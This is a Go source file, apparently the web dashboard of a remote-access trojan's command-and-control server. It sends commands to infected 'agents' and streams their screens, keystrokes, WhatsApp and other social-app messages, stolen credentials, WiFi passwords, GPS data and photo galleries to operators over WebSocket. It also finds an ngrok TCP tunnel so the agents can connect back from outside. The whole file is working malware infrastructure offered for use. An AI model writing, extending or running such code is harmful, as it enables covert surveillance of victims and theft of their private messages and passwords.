package main

import (
    "encoding/json"
    "log"
    "fmt"
    "net/http"
    "strconv"
    "strings"
    "sync"
    "time"
    "os"
    "net"

    "github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
    CheckOrigin: func(r *http.Request) bool {
        return true
    },
}

var wsClients = make(map[*websocket.Conn]bool)
var wsMutex sync.Mutex

type WebHandler struct {
    server *Server
}

type APIResponse struct {
    Success bool        `json:"success"`
    Message string      `json:"message,omitempty"`
    Data    interface{} `json:"data,omitempty"`
}

func StartWebServer(config *Config, server *Server) {
    handler := &WebHandler{server: server}
    http.HandleFunc("/api/c2", handler.handleC2Config)
    http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("./web/static/"))))

    http.HandleFunc("/ws", handler.handleWebSocket)

    http.HandleFunc("/api/agents", handler.handleAgents)
    http.HandleFunc("/api/agent/", handler.handleAgent)
    http.HandleFunc("/api/command/", handler.handleCommand)
    http.HandleFunc("/api/screenshots/", handler.handleScreenshots)
    http.HandleFunc("/api/keylogs/", handler.handleKeylogs)
    http.HandleFunc("/api/whatsapp/", handler.handleWhatsApp)
    http.HandleFunc("/api/export/", handler.handleExport)

    http.HandleFunc("/", handler.handleIndex)
    http.HandleFunc("/agent/", handler.handleAgentPage)

    log.Printf("🌐 Web server starting on %s", config.GetWebAddress())
    if err := http.ListenAndServe(config.GetWebAddress(), nil); err != nil {
        log.Printf("Web server error: %v", err)
    }
}

// ==================== WEBSOCKET ====================

func (h *WebHandler) handleWebSocket(w http.ResponseWriter, r *http.Request) {
    conn, err := upgrader.Upgrade(w, r, nil)
    if err != nil {
        log.Printf("WebSocket upgrade error: %v", err)
        return
    }
    defer conn.Close()

    wsMutex.Lock()
    wsClients[conn] = true
    wsMutex.Unlock()

    log.Printf("✅ WebSocket client connected")

    h.sendAgentList(conn)

    for {
        _, msg, err := conn.ReadMessage()
        if err != nil {
            break
        }

        var data map[string]interface{}
        if err := json.Unmarshal(msg, &data); err != nil {
            continue
        }

        action, _ := data["action"].(string)
        switch action {
        case "get_agents":
            h.sendAgentList(conn)
        case "get_agent":
            agentID, _ := data["agent_id"].(string)
            h.sendAgentDetail(conn, agentID)
        case "send_command":
            agentID, _ := data["agent_id"].(string)
            command, _ := data["command"].(string)
            params, _ := data["params"].(string)
            h.handleWSCommand(conn, agentID, command, params)
        }
    }

    wsMutex.Lock()
    delete(wsClients, conn)
    wsMutex.Unlock()
    log.Printf("🔌 WebSocket client disconnected")
}

func (h *WebHandler) sendAgentList(conn *websocket.Conn) {
    agents := h.server.GetAgents()
    data := map[string]interface{}{
        "type":   "agent_list",
        "agents": agents,
    }
    wsMutex.Lock()
    defer wsMutex.Unlock()
    conn.WriteJSON(data)
}

func (h *WebHandler) sendAgentDetail(conn *websocket.Conn, agentID string) {
    agent := h.server.getAgentByID(agentID)
    if agent == nil {
        wsMutex.Lock()
        defer wsMutex.Unlock()
        conn.WriteJSON(map[string]interface{}{
            "type":    "error",
            "message": "Agent not found",
        })
        return
    }

    data := map[string]interface{}{
        "type":  "agent_detail",
        "agent": agent,
    }
    wsMutex.Lock()
    defer wsMutex.Unlock()
    conn.WriteJSON(data)
}

func (h *WebHandler) handleWSCommand(conn *websocket.Conn, agentID, command, params string) {
    cmdID, err := h.server.SendCommand(agentID, command, params)
    if err != nil {
        wsMutex.Lock()
        defer wsMutex.Unlock()
        conn.WriteJSON(map[string]interface{}{
            "type":    "error",
            "message": err.Error(),
        })
        return
    }

    wsMutex.Lock()
    defer wsMutex.Unlock()
    conn.WriteJSON(map[string]interface{}{
        "type":       "command_sent",
        "command_id": cmdID,
        "agent_id":   agentID,
        "command":    command,
    })
}

// ==================== BROADCAST FUNCTIONS ====================

// handler.go - Ganti method BroadcastFrame()

func BroadcastFrame(agentID string, frameData map[string]interface{}) {
    wsMutex.Lock()
    defer wsMutex.Unlock()

    // ✅ CEK APAKAH ADA DATA FRAME
    var frameDataStr string
    var hasData bool
    
    // Cek di berbagai field
    if data, ok := frameData["data"].(string); ok && len(data) > 100 {
        frameDataStr = data
        hasData = true
    } else if data, ok := frameData["frame_data"].(string); ok && len(data) > 100 {
        frameDataStr = data
        hasData = true
    } else if data, ok := frameData["image_data"].(string); ok && len(data) > 100 {
        frameDataStr = data
        hasData = true
    }
    
    // Cek di nested frame object
    if !hasData {
        if frameObj, ok := frameData["frame"].(map[string]interface{}); ok {
            if data, ok := frameObj["data"].(string); ok && len(data) > 100 {
                frameDataStr = data
                hasData = true
                // Update frameData dengan data dari nested
                frameData["data"] = data
                frameData["width"] = frameObj["width"]
                frameData["height"] = frameObj["height"]
            }
        }
    }
    
    // ✅ CEK JUGA DI FIELD "result"
    if !hasData {
        if result, ok := frameData["result"].(map[string]interface{}); ok {
            if data, ok := result["data"].(string); ok && len(data) > 100 {
                frameDataStr = data
                hasData = true
                frameData["data"] = data
                frameData["width"] = result["width"]
                frameData["height"] = result["height"]
            }
        }
    }
    
    if !hasData {
        log.Printf("⚠️ [BROADCAST] Skipping - no valid frame data for agent %s", agentID)
        return
    }

    // ✅ BUAT DATA UNTUK WEBSOCKET
    data := map[string]interface{}{
        "type":      "screen_frame",
        "agent_id":  agentID,
        "frame": map[string]interface{}{
            "data":         frameDataStr,
            "width":        frameData["width"],
            "height":       frameData["height"],
            "frame_number": frameData["frame_number"],
            "timestamp":    frameData["timestamp"],
            "size":         len(frameDataStr),
        },
        "timestamp": time.Now().Unix(),
    }

    // ✅ BROADCAST KE SEMUA WEBSOCKET CLIENTS
    if len(wsClients) > 0 {
        log.Printf("📡 Broadcasting frame to %d WebSocket clients (agent: %s, size: %d)", 
            len(wsClients), agentID, len(frameDataStr))
    }

    for conn := range wsClients {
        if err := conn.WriteJSON(data); err != nil {
            log.Printf("❌ WebSocket frame broadcast error: %v", err)
            conn.Close()
            delete(wsClients, conn)
        }
    }
}



func BroadcastVideoFrame(agentID string, frameData map[string]interface{}) {
    wsMutex.Lock()
    defer wsMutex.Unlock()

    data := map[string]interface{}{
        "type":      "video_frame",
        "agent_id":  agentID,
        "frame":     frameData,
        "timestamp": time.Now().Unix(),
    }

    for conn := range wsClients {
        if err := conn.WriteJSON(data); err != nil {
            log.Printf("WebSocket video broadcast error: %v", err)
            conn.Close()
            delete(wsClients, conn)
        }
    }
}

func BroadcastResponse(agentID, command string, result map[string]interface{}) {
    wsMutex.Lock()
    defer wsMutex.Unlock()

    data := map[string]interface{}{
        "type":      "command_response",
        "agent_id":  agentID,
        "command":   command,
        "result":    result,
        "timestamp": time.Now().Unix(),
    }

    log.Printf("📤 Broadcasting response: %s -> %s", agentID, command)

    for conn := range wsClients {
        if err := conn.WriteJSON(data); err != nil {
            log.Printf("WebSocket response broadcast error: %v", err)
            conn.Close()
            delete(wsClients, conn)
        }
    }
}

// handler.go - GANTI method BroadcastKeylog()

func BroadcastKeylog(agentID string, keylogData map[string]interface{}) {
    wsMutex.Lock()
    defer wsMutex.Unlock()

    // ✅ AMBIL DATA DARI KEYLOGDATA
    logs := ""
    count := 0
    isLogging := false
    queueSize := 0
    historySize := 0

    if l, ok := keylogData["logs"].(string); ok {
        logs = l
    }
    if c, ok := keylogData["count"].(int); ok {
        count = c
    }
    if c, ok := keylogData["count"].(float64); ok {
        count = int(c)
    }
    if l, ok := keylogData["is_logging"].(bool); ok {
        isLogging = l
    }
    if q, ok := keylogData["queue_size"].(int); ok {
        queueSize = q
    }
    if q, ok := keylogData["queue_size"].(float64); ok {
        queueSize = int(q)
    }
    if h, ok := keylogData["history_size"].(int); ok {
        historySize = h
    }
    if h, ok := keylogData["history_size"].(float64); ok {
        historySize = int(h)
    }

    data := map[string]interface{}{
        "type":      "keylog_data",
        "agent_id":  agentID,
        "data": map[string]interface{}{
            "logs":         logs,
            "count":        count,
            "is_logging":   isLogging,
            "queue_size":   queueSize,
            "history_size": historySize,
        },
        "timestamp": time.Now().Unix(),
    }

    log.Printf("⌨️ Broadcasting keylog to %d clients", len(wsClients))

    for conn := range wsClients {
        if err := conn.WriteJSON(data); err != nil {
            log.Printf("WebSocket keylog broadcast error: %v", err)
            conn.Close()
            delete(wsClients, conn)
        }
    }
}

func BroadcastAgentUpdate(agent *Agent) {
    if agent == nil || agent.ID == "" {
        return
    }

    wsMutex.Lock()
    defer wsMutex.Unlock()

    data := map[string]interface{}{
        "type":      "agent_update",
        "agent":     agent,
        "timestamp": time.Now().Unix(),
    }

    for conn := range wsClients {
        if err := conn.WriteJSON(data); err != nil {
            log.Printf("WebSocket agent update broadcast error: %v", err)
            conn.Close()
            delete(wsClients, conn)
        }
    }
}

func BroadcastWhatsAppMessage(agentID, appName, sender, message, timestamp string) {
    wsMutex.Lock()
    defer wsMutex.Unlock()

    data := map[string]interface{}{
        "type":      "whatsapp_message",
        "agent_id":  agentID,
        "app_name":  appName,
        "sender":    sender,
        "message":   message,
        "timestamp": timestamp,
        "time_ms":   time.Now().Unix(),
    }

    log.Printf("💬 Broadcasting WhatsApp message: %s -> %s", sender, message[:min(len(message), 50)])

    for conn := range wsClients {
        if err := conn.WriteJSON(data); err != nil {
            log.Printf("WebSocket whatsapp broadcast error: %v", err)
            conn.Close()
            delete(wsClients, conn)
        }
    }
}

// ==================== SOCIAL MESSAGE BROADCAST ====================

func BroadcastSocialMessage(agentID, appName, platform, sender, message, timestamp string) {
    wsMutex.Lock()
    defer wsMutex.Unlock()

    icon := getPlatformIcon(platform)
    
    data := map[string]interface{}{
        "type":       "social_message",
        "agent_id":   agentID,
        "app_name":   appName,
        "platform":   platform,
        "sender":     sender,
        "message":    message,
        "timestamp":  timestamp,
        "icon":       icon,
        "time_ms":    time.Now().Unix(),
    }

    log.Printf("💬 Broadcasting %s message: %s -> %s", appName, sender, message[:min(len(message), 50)])

    for conn := range wsClients {
        if err := conn.WriteJSON(data); err != nil {
            log.Printf("WebSocket social broadcast error: %v", err)
            conn.Close()
            delete(wsClients, conn)
        }
    }
}

func getPlatformIcon(platform string) string {
    switch platform {
    case "instagram":
        return "📸"
    case "twitter":
        return "🐦"
    case "whatsapp":
        return "💬"
    case "telegram":
        return "✈️"
    case "signal":
        return "🔐"
    case "messenger":
        return "💙"
    case "line":
        return "💚"
    case "discord":
        return "🎮"
    case "tiktok":
        return "🎵"
    case "lemo":
        return "💛"
    case "litmatch":
        return "🔥"
    case "michat":
        return "💜"
    case "wechat":
        return "🟢"
    case "kakao":
        return "🟡"
    case "viber":
        return "🟣"
    case "hangouts":
        return "💚"
    case "groupme":
        return "🔵"
    case "slack":
        return "💜"
    case "teams":
        return "🟣"
    default:
        return "📱"
    }
}

// ==================== API HANDLERS ====================

func (h *WebHandler) handleAgents(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Content-Type", "application/json")

    if r.Method == "GET" {
        agents := h.server.GetAgents()
        json.NewEncoder(w).Encode(APIResponse{
            Success: true,
            Data:    agents,
        })
        return
    }

    json.NewEncoder(w).Encode(APIResponse{
        Success: false,
        Message: "Method not allowed",
    })
}

func (h *WebHandler) handleAgent(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Content-Type", "application/json")

    path := strings.TrimPrefix(r.URL.Path, "/api/agent/")
    parts := strings.Split(path, "/")
    agentID := parts[0]

    if agentID == "" {
        json.NewEncoder(w).Encode(APIResponse{
            Success: false,
            Message: "Agent ID required",
        })
        return
    }

    agent := h.server.getAgentByID(agentID)
    if agent == nil {
        json.NewEncoder(w).Encode(APIResponse{
            Success: false,
            Message: "Agent not found",
        })
        return
    }

    if r.Method == "GET" {
        json.NewEncoder(w).Encode(APIResponse{
            Success: true,
            Data:    agent,
        })
        return
    }

    if r.Method == "DELETE" {
        h.server.removeAgent(agentID)
        json.NewEncoder(w).Encode(APIResponse{
            Success: true,
            Message: "Agent disconnected",
        })
        return
    }

    json.NewEncoder(w).Encode(APIResponse{
        Success: false,
        Message: "Method not allowed",
    })
}

func (h *WebHandler) handleCommand(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Content-Type", "application/json")

    if r.Method != "POST" {
        json.NewEncoder(w).Encode(APIResponse{
            Success: false,
            Message: "Method not allowed",
        })
        return
    }

    var req struct {
        AgentID string `json:"agent_id"`
        Command string `json:"command"`
        Params  string `json:"params"`
    }

    if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
        json.NewEncoder(w).Encode(APIResponse{
            Success: false,
            Message: "Invalid request body",
        })
        return
    }

    if req.AgentID == "" || req.Command == "" {
        json.NewEncoder(w).Encode(APIResponse{
            Success: false,
            Message: "Agent ID and command required",
        })
        return
    }

    cmdID, err := h.server.SendCommand(req.AgentID, req.Command, req.Params)
    if err != nil {
        json.NewEncoder(w).Encode(APIResponse{
            Success: false,
            Message: err.Error(),
        })
        return
    }

    json.NewEncoder(w).Encode(APIResponse{
        Success: true,
        Message: "Command sent",
        Data: map[string]string{
            "command_id": cmdID,
        },
    })
}

func (h *WebHandler) handleScreenshots(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Content-Type", "application/json")

    path := strings.TrimPrefix(r.URL.Path, "/api/screenshots/")
    parts := strings.Split(path, "/")
    agentID := parts[0]

    limit := 10
    if len(parts) > 1 {
        if l, err := strconv.Atoi(parts[1]); err == nil {
            limit = l
        }
    }

    json.NewEncoder(w).Encode(APIResponse{
        Success: true,
        Data: map[string]interface{}{
            "agent_id":    agentID,
            "limit":       limit,
            "screenshots": []interface{}{},
        },
    })
}

func (h *WebHandler) handleKeylogs(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Content-Type", "application/json")

    path := strings.TrimPrefix(r.URL.Path, "/api/keylogs/")
    parts := strings.Split(path, "/")
    agentID := parts[0]

    limit := 100
    if len(parts) > 1 {
        if l, err := strconv.Atoi(parts[1]); err == nil {
            limit = l
        }
    }

    json.NewEncoder(w).Encode(APIResponse{
        Success: true,
        Data: map[string]interface{}{
            "agent_id": agentID,
            "limit":    limit,
            "keylogs":  []interface{}{},
        },
    })
}

func (h *WebHandler) handleWhatsApp(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Content-Type", "application/json")

    path := strings.TrimPrefix(r.URL.Path, "/api/whatsapp/")
    parts := strings.Split(path, "/")
    agentID := parts[0]

    json.NewEncoder(w).Encode(APIResponse{
        Success: true,
        Data: map[string]interface{}{
            "agent_id": agentID,
            "messages": []interface{}{},
        },
    })
}


// ==================== CREDENTIALS BROADCAST ====================

func BroadcastCredentials(agentID string, result map[string]interface{}) {
    wsMutex.Lock()
    defer wsMutex.Unlock()
    
    data := map[string]interface{}{
        "type":      "credentials_data",
        "agent_id":  agentID,
        "data":      result,
        "timestamp": time.Now().Unix(),
    }
    
    log.Printf("🔐 Broadcasting credentials for %s to %d clients", agentID, len(wsClients))
    
    for conn := range wsClients {
        if err := conn.WriteJSON(data); err != nil {
            log.Printf("WebSocket credentials broadcast error: %v", err)
            conn.Close()
            delete(wsClients, conn)
        }
    }
}

func BroadcastWifiPasswords(agentID string, result map[string]interface{}) {
    wsMutex.Lock()
    defer wsMutex.Unlock()
    
    data := map[string]interface{}{
        "type":      "wifi_passwords",
        "agent_id":  agentID,
        "data":      result,
        "timestamp": time.Now().Unix(),
    }
    
    log.Printf("📶 Broadcasting WiFi passwords for %s", agentID)
    
    for conn := range wsClients {
        if err := conn.WriteJSON(data); err != nil {
            log.Printf("WebSocket WiFi broadcast error: %v", err)
            conn.Close()
            delete(wsClients, conn)
        }
    }
}

func (h *WebHandler) handleExport(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Content-Type", "application/json")

    path := strings.TrimPrefix(r.URL.Path, "/api/export/")
    parts := strings.Split(path, "/")
    agentID := parts[0]
    exportType := "all"
    if len(parts) > 1 {
        exportType = parts[1]
    }

    json.NewEncoder(w).Encode(APIResponse{
        Success: true,
        Data: map[string]interface{}{
            "agent_id":    agentID,
            "export_type": exportType,
            "data":        "Export data here",
        },
    })
}

// handler.go - TAMBAHKAN FUNGSI BARU

func BroadcastKeylogFull(agentID string, logs string, count int, isLogging bool, queueSize int, historySize int) {
    wsMutex.Lock()
    defer wsMutex.Unlock()

    // ✅ DATA LENGKAP UNTUK DASHBOARD
    data := map[string]interface{}{
        "type":      "keylog_data",
        "agent_id":  agentID,
        "data": map[string]interface{}{
            "logs":         logs,
            "count":        count,
            "is_logging":   isLogging,
            "queue_size":   queueSize,
            "history_size": historySize,
        },
        "timestamp": time.Now().Unix(),
    }

    log.Printf("⌨️ Broadcasting keylog to %d clients (size: %d bytes, count: %d)", 
        len(wsClients), len(logs), count)

    for conn := range wsClients {
        if err := conn.WriteJSON(data); err != nil {
            log.Printf("WebSocket keylog broadcast error: %v", err)
            conn.Close()
            delete(wsClients, conn)
        }
    }
}


func (h *WebHandler) handleC2Config(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Content-Type", "application/json")
    
    // Query ngrok API untuk get current tunnel
    host, port := getNgrokTunnel()
    
    response := map[string]interface{}{
        "host": host,
        "port": port,
    }
    
    json.NewEncoder(w).Encode(response)
}

// Get current ngrok tunnel URL
// ==================== NGROK TUNNEL - FULLY AUTOMATIC ====================

func getNgrokTunnel() (string, int) {
    // Priority 1: Langsung dari Ngrok API (paling akurat)
    if host, port := fetchNgrokAPI(); host != "" && port > 0 {
        log.Printf("✅ Ngrok tunnel detected via API: %s:%d", host, port)
        return host, port
    }

    // Priority 2: Dari config.json (ngrok_host & ngrok_port)
    if host, port := getNgrokFromConfigFile(); host != "" && port > 0 {
        log.Printf("📁 Ngrok config loaded from file: %s:%d", host, port)
        return host, port
    }

    // Priority 3: Cari proses ngrok yang sedang berjalan di sistem
    if host, port := detectRunningNgrokProcess(); host != "" && port > 0 {
        log.Printf("🔍 Detected running ngrok process: %s:%d", host, port)
        return host, port
    }

    // Priority 4: Jika semua gagal, return kosong (bukan fallback hardcoded)
    log.Printf("⚠️ No active Ngrok tunnel found. Agent will use direct connection.")
    return "", 0
}

// Fetch dari Ngrok Web Interface
func fetchNgrokAPI() (string, int) {
    // ✅ TRY MULTIPLE ENDPOINTS WITH PROPER ERROR HANDLING
    endpoints := []string{
        "http://localhost:4040/api/tunnels",      // Default ngrok API
        "http://127.0.0.1:4040/api/tunnels",      // Localhost alternative
        "http://localhost:5000/api/tunnels",      // Alternative port
    }

    client := &http.Client{
        Timeout: 3 * time.Second,
    }

    for _, endpoint := range endpoints {
        log.Printf("🔍 Trying ngrok API endpoint: %s", endpoint)
        
        resp, err := client.Get(endpoint)
        if err != nil {
            log.Printf("  ❌ Failed: %v", err)
            continue
        }
        defer resp.Body.Close()

        if resp.StatusCode != http.StatusOK {
            log.Printf("  ❌ Status: %d", resp.StatusCode)
            continue
        }

        var result struct {
            Tunnels []struct {
                PublicURL string `json:"public_url"`
                Proto     string `json:"proto"`
            } `json:"tunnels"`
        }

        if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
            log.Printf("  ❌ Decode error: %v", err)
            continue
        }

        // Find TCP tunnel
        for _, t := range result.Tunnels {
            if t.Proto == "tcp" && t.PublicURL != "" {
                parts := strings.Split(strings.TrimPrefix(t.PublicURL, "tcp://"), ":")
                if len(parts) == 2 {
                    if port, err := strconv.Atoi(parts[1]); err == nil {
                        log.Printf("  ✅ Found tunnel: %s:%d", parts[0], port)
                        return parts[0], port
                    }
                }
            }
        }
    }

    log.Printf("⚠️ No ngrok API response from any endpoint")
    return "", 0
}

// Dari config.json
func getNgrokFromConfigFile() (string, int) {
    data, err := os.ReadFile("config.json")
    if err != nil {
        log.Printf("  ⚠️ config.json not found: %v", err)
        return "", 0
    }

    var cfg Config  // ✅ Use actual Config struct
    if err := json.Unmarshal(data, &cfg); err != nil {
        log.Printf("  ⚠️ config.json parse error: %v", err)
        return "", 0
    }

    if cfg.NgrokHost != "" && cfg.NgrokPort > 0 {
        log.Printf("  📁 Using config: %s:%d", cfg.NgrokHost, cfg.NgrokPort)
        return cfg.NgrokHost, cfg.NgrokPort
    }

    log.Printf("  ⚠️ ngrok_host or ngrok_port empty in config.json")
    return "", 0
}

// Deteksi proses ngrok yang sedang berjalan (Linux)
func detectRunningNgrokProcess() (string, int) {
    // ✅ TRY TO CONNECT TO COMMON NGROK PORTS
    commonPorts := []int{4040, 5000, 14321, 25375, 12345, 1337, 4444}

    for _, p := range commonPorts {
        addr := fmt.Sprintf("localhost:%d", p)
        
        conn, err := net.DialTimeout("tcp", addr, 1*time.Second)
        if err == nil {
            conn.Close()
            
            if p == 4040 {
                if host, port := fetchNgrokAPI(); host != "" && port > 0 {
                    return host, port
                }
            }
            
            log.Printf("  🔗 Found open port: %d", p)
        }
    }

    return "", 0
}

// Verify ngrok connection at startup
func VerifyNgrokConnection(config *Config) {
    log.Printf("\n📡 Verifying Ngrok Connection...")
    
    host, port := getNgrokTunnel()
    
    if host != "" && port > 0 {
        log.Printf("✅ Ngrok tunnel verified: %s:%d", host, port)
        config.NgrokHost = host
        config.NgrokPort = port
        SaveConfig(config)
        log.Printf("✅ Config updated: ngrok_host=%s, ngrok_port=%d", host, port)
    } else {
        log.Printf("⚠️ WARNING: No active Ngrok tunnel!")
        log.Printf("   - Run: ngrok tcp 4444")
        log.Printf("   - Or configure config.json with ngrok_host & ngrok_port")
        log.Printf("   - Agents will use: %s", config.GetAddress())
    }
}

// ==================== GPS STATUS BROADCAST ====================

func BroadcastGPSStatus(agentID string, status map[string]interface{}) {
    wsMutex.Lock()
    defer wsMutex.Unlock()
    
    data := map[string]interface{}{
        "type":      "gps_status",
        "agent_id":  agentID,
        "data":      status,
        "timestamp": time.Now().Unix(),
    }
    
    log.Printf("🛰️ Broadcasting GPS status for %s", agentID)
    
    for conn := range wsClients {
        if err := conn.WriteJSON(data); err != nil {
            log.Printf("WebSocket GPS status broadcast error: %v", err)
            conn.Close()
            delete(wsClients, conn)
        }
    }
}

// ==================== GALLERY BROADCAST ====================

func BroadcastGallery(agentID string, result map[string]interface{}) {
    wsMutex.Lock()
    defer wsMutex.Unlock()
    
    data := map[string]interface{}{
        "type":      "gallery_data",
        "agent_id":  agentID,
        "data":      result,
        "timestamp": time.Now().Unix(),
    }
    
    log.Printf("🖼️ Broadcasting gallery for %s to %d clients", agentID, len(wsClients))
    
    for conn := range wsClients {
        if err := conn.WriteJSON(data); err != nil {
            log.Printf("WebSocket gallery broadcast error: %v", err)
            conn.Close()
            delete(wsClients, conn)
        }
    }
}

// ==================== WEB UI ====================

func (h *WebHandler) handleIndex(w http.ResponseWriter, r *http.Request) {
    if r.URL.Path != "/" {
        http.NotFound(w, r)
        return
    }
    http.ServeFile(w, r, "./web/templates/index.html")
}

func (h *WebHandler) handleAgentPage(w http.ResponseWriter, r *http.Request) {
    path := strings.TrimPrefix(r.URL.Path, "/agent/")
    if path == "" {
        http.Redirect(w, r, "/", http.StatusFound)
        return
    }
    http.ServeFile(w, r, "./web/templates/agent.html")
}



